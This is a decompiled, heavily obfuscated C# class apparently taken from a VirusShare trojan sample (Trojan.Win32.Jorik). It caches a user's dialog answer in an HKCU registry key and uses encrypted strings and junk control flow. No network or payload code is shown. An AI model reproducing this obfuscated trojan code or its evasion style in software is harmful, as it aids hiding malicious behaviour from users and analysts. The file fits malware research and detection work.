// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ccy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=cc6f4431894d1c97
// MVID: 2A74CDCD-1E5F-40DD-90C8-12E38E6596C8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Jorik.Llac.cfi-7d3f633a775aae62503ba637b47672afca334a930966f3c35ac40563155370b2.exe

using \u0001;
using \u0007;
using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace \u0007
{
  internal class \u0005 : \u0006.\u0006
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    internal static readonly string \u0001;
    internal static readonly string \u0002;
    private static bool? \u0001;

    public static void \u0003([In] uint obj0) => new \u0005().\u0002(obj0);

    public static void \u0003([In] string obj0) => new \u0005().\u0002(obj0);

    protected override void \u0002([In] \u0007.\u0001 obj0) => obj0.\u0003();

    protected override bool \u0002() => \u0005.\u0003();

    private static bool \u0003()
    {
      if (!\u0005.\u0001.HasValue)
        goto label_2;
label_1:
      return \u0005.\u0001.Value;
label_2:
      \u0005.\u0003();
      goto label_1;
    }

    private static void \u0003()
    {
      RegistryKey registryKey = (RegistryKey) null;
      try
      {
        string subkey = \u0005.\u0001(3060) + \u0005.\u0002 + \u0005.\u0001(3073) + \u0005.\u0001;
        do
        {
          registryKey = Registry.CurrentUser.CreateSubKey(subkey);
        }
        while (false);
        object obj = registryKey.GetValue(\u0005.\u0001(3078));
        if (obj == null)
        {
          if (false)
            return;
          registryKey.SetValue(\u0005.\u0001(3078), (object) bool.FalseString);
          bool flag = \u0005.\u0004();
          registryKey.SetValue(\u0005.\u0001(3078), (object) flag.ToString(), RegistryValueKind.String);
          \u0005.\u0001 = new bool?(flag);
        }
        else
          \u0005.\u0001 = new bool?(Convert.ToBoolean(obj));
      }
      catch
      {
        \u0005.\u0001 = new bool?(false);
      }
      finally
      {
        registryKey?.Close();
      }
    }

    private static bool \u0004()
    {
      bool flag;
      using (\u0003 obj = new \u0003())
      {
        if (true)
          goto label_4;
label_2:
        int num1 = obj.DialogResult == DialogResult.Yes ? 1 : 0;
        if (true)
        {
          flag = num1 != 0;
          goto label_8;
        }
        else
          goto label_8;
label_4:
        int num2 = (int) obj.ShowDialog();
        goto label_2;
      }
label_8:
      return flag;
    }

    static \u0005()
    {
      \u0002.\u0002(typeof (\u0005));
      \u0005.\u0001 = \u0005.\u0001(3111);
      \u0005.\u0002 = \u0005.\u0001(3116);
    }
  }
}
